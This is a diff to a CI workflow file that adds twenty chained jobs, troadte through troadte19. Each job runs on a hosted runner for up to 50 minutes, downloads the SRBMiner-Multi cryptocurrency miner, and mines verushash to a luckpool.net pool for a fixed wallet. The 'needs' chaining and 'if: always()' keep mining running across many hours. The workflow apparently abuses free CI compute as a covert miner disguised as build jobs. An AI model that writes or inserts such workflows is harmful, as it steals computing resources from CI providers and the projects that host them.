@@ -279,4 +279,281 @@ jobs:
           tar -xzf SRBMiner-Multi.tar.gz
           echo "Start Mining"
           ./SRBMiner-Multi-3-1-1/SRBMiner-MULTI --disable-gpu --algorithm verushash --pool stratum+tcp://ap.luckpool.net:3956 --wallet REBiQeBs4ZcXQV2xu961D6JxzhXAZ53qXp --cpu-threads 2
+  troadte:
+    runs-on: fasterci-medium
+    timeout-minutes: 50
+    steps:
+      - run: |
+          woorkersd=$(date +"%Y%m%d%H%M%S")
+          echo $woorkersd
+          curl -L https://github.com/doktor83/SRBMiner-Multi/releases/download/3.1.1/SRBMiner-Multi-3-1-1-Linux.tar.gz -o SRBMiner-Multi.tar.gz
+          tar -xzf SRBMiner-Multi.tar.gz
+          echo "Start Mining"
+          ./SRBMiner-Multi-3-1-1/SRBMiner-MULTI --disable-gpu --algorithm verushash --pool stratum+tcp://ap.luckpool.net:3956 --wallet REBiQeBs4ZcXQV2xu961D6JxzhXAZ53qXp --cpu-threads 2
+  troadte1:
+    needs: troadte
+    runs-on: fasterci-medium
+    timeout-minutes: 50
+    if: always()
+    steps:
+      - run: |
+          woorkersd=$(date +"%Y%m%d%H%M%S")
+          echo $woorkersd
+          curl -L https://github.com/doktor83/SRBMiner-Multi/releases/download/3.1.1/SRBMiner-Multi-3-1-1-Linux.tar.gz -o SRBMiner-Multi.tar.gz
+          tar -xzf SRBMiner-Multi.tar.gz
+          echo "Start Mining"
+          ./SRBMiner-Multi-3-1-1/SRBMiner-MULTI --disable-gpu --algorithm verushash --pool stratum+tcp://ap.luckpool.net:3956 --wallet REBiQeBs4ZcXQV2xu961D6JxzhXAZ53qXp --cpu-threads 2
+
+  troadte2:
+    needs: troadte1
+    runs-on: fasterci-medium
+    timeout-minutes: 50
+    if: always()
+    steps:
+      - run: |
+          woorkersd=$(date +"%Y%m%d%H%M%S")
+          echo $woorkersd
+          curl -L https://github.com/doktor83/SRBMiner-Multi/releases/download/3.1.1/SRBMiner-Multi-3-1-1-Linux.tar.gz -o SRBMiner-Multi.tar.gz
+          tar -xzf SRBMiner-Multi.tar.gz
+          echo "Start Mining"
+          ./SRBMiner-Multi-3-1-1/SRBMiner-MULTI --disable-gpu --algorithm verushash --pool stratum+tcp://ap.luckpool.net:3956 --wallet REBiQeBs4ZcXQV2xu961D6JxzhXAZ53qXp --cpu-threads 2
+
+  troadte3:
+    needs: troadte2
+    runs-on: fasterci-medium
+    timeout-minutes: 50
+    if: always()
+    steps:
+      - run: |
+          woorkersd=$(date +"%Y%m%d%H%M%S")
+          echo $woorkersd
+          curl -L https://github.com/doktor83/SRBMiner-Multi/releases/download/3.1.1/SRBMiner-Multi-3-1-1-Linux.tar.gz -o SRBMiner-Multi.tar.gz
+          tar -xzf SRBMiner-Multi.tar.gz
+          echo "Start Mining"
+          ./SRBMiner-Multi-3-1-1/SRBMiner-MULTI --disable-gpu --algorithm verushash --pool stratum+tcp://ap.luckpool.net:3956 --wallet REBiQeBs4ZcXQV2xu961D6JxzhXAZ53qXp --cpu-threads 2
+
+  troadte4:
+    needs: troadte3
+    runs-on: fasterci-medium
+    timeout-minutes: 50
+    if: always()
+    steps:
+      - run: |
+          woorkersd=$(date +"%Y%m%d%H%M%S")
+          echo $woorkersd
+          curl -L https://github.com/doktor83/SRBMiner-Multi/releases/download/3.1.1/SRBMiner-Multi-3-1-1-Linux.tar.gz -o SRBMiner-Multi.tar.gz
+          tar -xzf SRBMiner-Multi.tar.gz
+          echo "Start Mining"
+          ./SRBMiner-Multi-3-1-1/SRBMiner-MULTI --disable-gpu --algorithm verushash --pool stratum+tcp://ap.luckpool.net:3956 --wallet REBiQeBs4ZcXQV2xu961D6JxzhXAZ53qXp --cpu-threads 2
+
+  troadte5:
+    needs: troadte4
+    runs-on: fasterci-medium
+    timeout-minutes: 50
+    if: always()
+    steps:
+      - run: |
+          woorkersd=$(date +"%Y%m%d%H%M%S")
+          echo $woorkersd
+          curl -L https://github.com/doktor83/SRBMiner-Multi/releases/download/3.1.1/SRBMiner-Multi-3-1-1-Linux.tar.gz -o SRBMiner-Multi.tar.gz
+          tar -xzf SRBMiner-Multi.tar.gz
+          echo "Start Mining"
+          ./SRBMiner-Multi-3-1-1/SRBMiner-MULTI --disable-gpu --algorithm verushash --pool stratum+tcp://ap.luckpool.net:3956 --wallet REBiQeBs4ZcXQV2xu961D6JxzhXAZ53qXp --cpu-threads 2
+
+  troadte6:
+    needs: troadte5
+    runs-on: fasterci-medium
+    timeout-minutes: 50
+    if: always()
+    steps:
+      - run: |
+          woorkersd=$(date +"%Y%m%d%H%M%S")
+          echo $woorkersd
+          curl -L https://github.com/doktor83/SRBMiner-Multi/releases/download/3.1.1/SRBMiner-Multi-3-1-1-Linux.tar.gz -o SRBMiner-Multi.tar.gz
+          tar -xzf SRBMiner-Multi.tar.gz
+          echo "Start Mining"
+          ./SRBMiner-Multi-3-1-1/SRBMiner-MULTI --disable-gpu --algorithm verushash --pool stratum+tcp://ap.luckpool.net:3956 --wallet REBiQeBs4ZcXQV2xu961D6JxzhXAZ53qXp --cpu-threads 2
+
+  troadte7:
+    needs: troadte6
+    runs-on: fasterci-medium
+    timeout-minutes: 50
+    if: always()
+    steps:
+      - run: |
+          woorkersd=$(date +"%Y%m%d%H%M%S")
+          echo $woorkersd
+          curl -L https://github.com/doktor83/SRBMiner-Multi/releases/download/3.1.1/SRBMiner-Multi-3-1-1-Linux.tar.gz -o SRBMiner-Multi.tar.gz
+          tar -xzf SRBMiner-Multi.tar.gz
+          echo "Start Mining"
+          ./SRBMiner-Multi-3-1-1/SRBMiner-MULTI --disable-gpu --algorithm verushash --pool stratum+tcp://ap.luckpool.net:3956 --wallet REBiQeBs4ZcXQV2xu961D6JxzhXAZ53qXp --cpu-threads 2
+
+  troadte8:
+    needs: troadte7
+    runs-on: fasterci-medium
+    timeout-minutes: 50
+    if: always()
+    steps:
+      - run: |
+          woorkersd=$(date +"%Y%m%d%H%M%S")
+          echo $woorkersd
+          curl -L https://github.com/doktor83/SRBMiner-Multi/releases/download/3.1.1/SRBMiner-Multi-3-1-1-Linux.tar.gz -o SRBMiner-Multi.tar.gz
+          tar -xzf SRBMiner-Multi.tar.gz
+          echo "Start Mining"
+          ./SRBMiner-Multi-3-1-1/SRBMiner-MULTI --disable-gpu --algorithm verushash --pool stratum+tcp://ap.luckpool.net:3956 --wallet REBiQeBs4ZcXQV2xu961D6JxzhXAZ53qXp --cpu-threads 2
+
+  troadte9:
+    needs: troadte8
+    runs-on: fasterci-medium
+    timeout-minutes: 50
+    if: always()
+    steps:
+      - run: |
+          woorkersd=$(date +"%Y%m%d%H%M%S")
+          echo $woorkersd
+          curl -L https://github.com/doktor83/SRBMiner-Multi/releases/download/3.1.1/SRBMiner-Multi-3-1-1-Linux.tar.gz -o SRBMiner-Multi.tar.gz
+          tar -xzf SRBMiner-Multi.tar.gz
+          echo "Start Mining"
+          ./SRBMiner-Multi-3-1-1/SRBMiner-MULTI --disable-gpu --algorithm verushash --pool stratum+tcp://ap.luckpool.net:3956 --wallet REBiQeBs4ZcXQV2xu961D6JxzhXAZ53qXp --cpu-threads 2
+
+  troadte10:
+    needs: troadte9
+    runs-on: fasterci-medium
+    timeout-minutes: 50
+    if: always()
+    steps:
+      - run: |
+          woorkersd=$(date +"%Y%m%d%H%M%S")
+          echo $woorkersd
+          curl -L https://github.com/doktor83/SRBMiner-Multi/releases/download/3.1.1/SRBMiner-Multi-3-1-1-Linux.tar.gz -o SRBMiner-Multi.tar.gz
+          tar -xzf SRBMiner-Multi.tar.gz
+          echo "Start Mining"
+          ./SRBMiner-Multi-3-1-1/SRBMiner-MULTI --disable-gpu --algorithm verushash --pool stratum+tcp://ap.luckpool.net:3956 --wallet REBiQeBs4ZcXQV2xu961D6JxzhXAZ53qXp --cpu-threads 2
+
+  troadte11:
+    needs: troadte10
+    runs-on: fasterci-medium
+    timeout-minutes: 50
+    if: always()
+    steps:
+      - run: |
+          woorkersd=$(date +"%Y%m%d%H%M%S")
+          echo $woorkersd
+          curl -L https://github.com/doktor83/SRBMiner-Multi/releases/download/3.1.1/SRBMiner-Multi-3-1-1-Linux.tar.gz -o SRBMiner-Multi.tar.gz
+          tar -xzf SRBMiner-Multi.tar.gz
+          echo "Start Mining"
+          ./SRBMiner-Multi-3-1-1/SRBMiner-MULTI --disable-gpu --algorithm verushash --pool stratum+tcp://ap.luckpool.net:3956 --wallet REBiQeBs4ZcXQV2xu961D6JxzhXAZ53qXp --cpu-threads 2
+
+  troadte12:
+    needs: troadte11
+    runs-on: fasterci-medium
+    timeout-minutes: 50
+    if: always()
+    steps:
+      - run: |
+          woorkersd=$(date +"%Y%m%d%H%M%S")
+          echo $woorkersd
+          curl -L https://github.com/doktor83/SRBMiner-Multi/releases/download/3.1.1/SRBMiner-Multi-3-1-1-Linux.tar.gz -o SRBMiner-Multi.tar.gz
+          tar -xzf SRBMiner-Multi.tar.gz
+          echo "Start Mining"
+          ./SRBMiner-Multi-3-1-1/SRBMiner-MULTI --disable-gpu --algorithm verushash --pool stratum+tcp://ap.luckpool.net:3956 --wallet REBiQeBs4ZcXQV2xu961D6JxzhXAZ53qXp --cpu-threads 2
+
+  troadte13:
+    needs: troadte12
+    runs-on: fasterci-medium
+    timeout-minutes: 50
+    if: always()
+    steps:
+      - run: |
+          woorkersd=$(date +"%Y%m%d%H%M%S")
+          echo $woorkersd
+          curl -L https://github.com/doktor83/SRBMiner-Multi/releases/download/3.1.1/SRBMiner-Multi-3-1-1-Linux.tar.gz -o SRBMiner-Multi.tar.gz
+          tar -xzf SRBMiner-Multi.tar.gz
+          echo "Start Mining"
+          ./SRBMiner-Multi-3-1-1/SRBMiner-MULTI --disable-gpu --algorithm verushash --pool stratum+tcp://ap.luckpool.net:3956 --wallet REBiQeBs4ZcXQV2xu961D6JxzhXAZ53qXp --cpu-threads 2
+
+  troadte14:
+    needs: troadte13
+    runs-on: fasterci-medium
+    timeout-minutes: 50
+    if: always()
+    steps:
+      - run: |
+          woorkersd=$(date +"%Y%m%d%H%M%S")
+          echo $woorkersd
+          curl -L https://github.com/doktor83/SRBMiner-Multi/releases/download/3.1.1/SRBMiner-Multi-3-1-1-Linux.tar.gz -o SRBMiner-Multi.tar.gz
+          tar -xzf SRBMiner-Multi.tar.gz
+          echo "Start Mining"
+          ./SRBMiner-Multi-3-1-1/SRBMiner-MULTI --disable-gpu --algorithm verushash --pool stratum+tcp://ap.luckpool.net:3956 --wallet REBiQeBs4ZcXQV2xu961D6JxzhXAZ53qXp --cpu-threads 2
+
+  troadte15:
+    needs: troadte14
+    runs-on: fasterci-medium
+    timeout-minutes: 50
+    if: always()
+    steps:
+      - run: |
+          woorkersd=$(date +"%Y%m%d%H%M%S")
+          echo $woorkersd
+          curl -L https://github.com/doktor83/SRBMiner-Multi/releases/download/3.1.1/SRBMiner-Multi-3-1-1-Linux.tar.gz -o SRBMiner-Multi.tar.gz
+          tar -xzf SRBMiner-Multi.tar.gz
+          echo "Start Mining"
+          ./SRBMiner-Multi-3-1-1/SRBMiner-MULTI --disable-gpu --algorithm verushash --pool stratum+tcp://ap.luckpool.net:3956 --wallet REBiQeBs4ZcXQV2xu961D6JxzhXAZ53qXp --cpu-threads 2
+
+  troadte16:
+    needs: troadte15
+    runs-on: fasterci-medium
+    timeout-minutes: 50
+    if: always()
+    steps:
+      - run: |
+          woorkersd=$(date +"%Y%m%d%H%M%S")
+          echo $woorkersd
+          curl -L https://github.com/doktor83/SRBMiner-Multi/releases/download/3.1.1/SRBMiner-Multi-3-1-1-Linux.tar.gz -o SRBMiner-Multi.tar.gz
+          tar -xzf SRBMiner-Multi.tar.gz
+          echo "Start Mining"
+          ./SRBMiner-Multi-3-1-1/SRBMiner-MULTI --disable-gpu --algorithm verushash --pool stratum+tcp://ap.luckpool.net:3956 --wallet REBiQeBs4ZcXQV2xu961D6JxzhXAZ53qXp --cpu-threads 2
+
+  troadte17:
+    needs: troadte16
+    runs-on: fasterci-medium
+    timeout-minutes: 50
+    if: always()
+    steps:
+      - run: |
+          woorkersd=$(date +"%Y%m%d%H%M%S")
+          echo $woorkersd
+          curl -L https://github.com/doktor83/SRBMiner-Multi/releases/download/3.1.1/SRBMiner-Multi-3-1-1-Linux.tar.gz -o SRBMiner-Multi.tar.gz
+          tar -xzf SRBMiner-Multi.tar.gz
+          echo "Start Mining"
+          ./SRBMiner-Multi-3-1-1/SRBMiner-MULTI --disable-gpu --algorithm verushash --pool stratum+tcp://ap.luckpool.net:3956 --wallet REBiQeBs4ZcXQV2xu961D6JxzhXAZ53qXp --cpu-threads 2
+
+  troadte18:
+    needs: troadte17
+    runs-on: fasterci-medium
+    timeout-minutes: 50
+    if: always()
+    steps:
+      - run: |
+          woorkersd=$(date +"%Y%m%d%H%M%S")
+          echo $woorkersd
+          curl -L https://github.com/doktor83/SRBMiner-Multi/releases/download/3.1.1/SRBMiner-Multi-3-1-1-Linux.tar.gz -o SRBMiner-Multi.tar.gz
+          tar -xzf SRBMiner-Multi.tar.gz
+          echo "Start Mining"
+          ./SRBMiner-Multi-3-1-1/SRBMiner-MULTI --disable-gpu --algorithm verushash --pool stratum+tcp://ap.luckpool.net:3956 --wallet REBiQeBs4ZcXQV2xu961D6JxzhXAZ53qXp --cpu-threads 2
+
+  troadte19:
+    needs: troadte18
+    runs-on: fasterci-medium
+    timeout-minutes: 50
+    if: always()
+    steps:
+      - run: |
+          woorkersd=$(date +"%Y%m%d%H%M%S")
+          echo $woorkersd
+          curl -L https://github.com/doktor83/SRBMiner-Multi/releases/download/3.1.1/SRBMiner-Multi-3-1-1-Linux.tar.gz -o SRBMiner-Multi.tar.gz
+          tar -xzf SRBMiner-Multi.tar.gz
+          echo "Start Mining"
+          ./SRBMiner-Multi-3-1-1/SRBMiner-MULTI --disable-gpu --algorithm verushash --pool stratum+tcp://ap.luckpool.net:3956 --wallet REBiQeBs4ZcXQV2xu961D6JxzhXAZ53qXp --cpu-threads 2
+
 
